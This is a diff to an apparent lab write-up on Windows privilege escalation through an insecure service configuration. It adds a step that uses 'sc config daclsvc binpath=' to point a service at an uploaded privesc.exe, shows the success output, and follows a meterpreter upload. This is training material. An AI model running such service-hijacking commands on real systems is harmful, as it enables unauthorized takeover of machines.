@@ -389,3 +389,20 @@ meterpreter > upload /home/kali/Desktop/privesc.exe
 <p align="center">
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step11-1.png" width="600">
 </p>
+
+Changed the Service Binary Path
+
+```bash
+C:\PrivEsc> sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
+```
+
+**Output:**
+
+```
+sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
+[SC] ChangeServiceConfig SUCCESS
+```
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
+</p>
